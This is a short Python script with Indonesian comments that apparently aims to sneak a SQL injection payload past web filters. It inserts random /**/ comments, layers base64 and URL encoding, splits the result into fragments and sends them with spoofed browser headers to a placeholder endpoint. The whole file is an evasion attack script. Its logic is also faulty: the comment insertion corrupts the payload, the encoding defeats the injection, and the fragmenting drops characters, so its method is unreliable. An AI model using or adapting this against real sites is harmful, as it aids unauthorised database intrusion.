import requests
import base64
import urllib.parse
import random

# Contoh payload asli
payload = "SELECT * FROM users WHERE username='admin'--"

# Obfuscation: sisip komentar /**/ secara acak di kata SELECT
def obfuscate_payload(s):
    parts = list(s)
    result = ""
    for c in parts:
        result += c
        if random.random() < 0.2:
            result += "/**/"
    return result

# Encoding berlapis: Base64 + URL encode
def encode_payload(s):
    base64_encoded = base64.b64encode(s.encode()).decode()
    url_encoded = urllib.parse.quote(base64_encoded)
    return url_encoded

# Fragmentasi payload menjadi potongan kecil
def fragment_payload(s, n=5):
    avg_len = len(s) // n
    return [s[i*avg_len:(i+1)*avg_len] for i in range(n)]

# Header spoofing
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36",
    "Referer": "https://legitimate-site.com",
}

# URL target (ganti dengan URL websitemu)
url = "https://your-own-site.com/vulnerable-endpoint"

# Compose modified payload
payload_obf = obfuscate_payload(payload)
payload_encoded = encode_payload(payload_obf)
payload_fragments = fragment_payload(payload_encoded)

# Kirim setiap fragmen sebagai request terpisah (contoh pake parameter 'q')
for frag in payload_fragments:
    params = {'q': frag}
    response = requests.get(url, headers=headers, params=params)
    print(f"Sent fragment: {frag}")
    print(f"Response status: {response.status_code}")

print("Finished sending obfuscated, encoded, fragmented payloads with spoofed headers.")
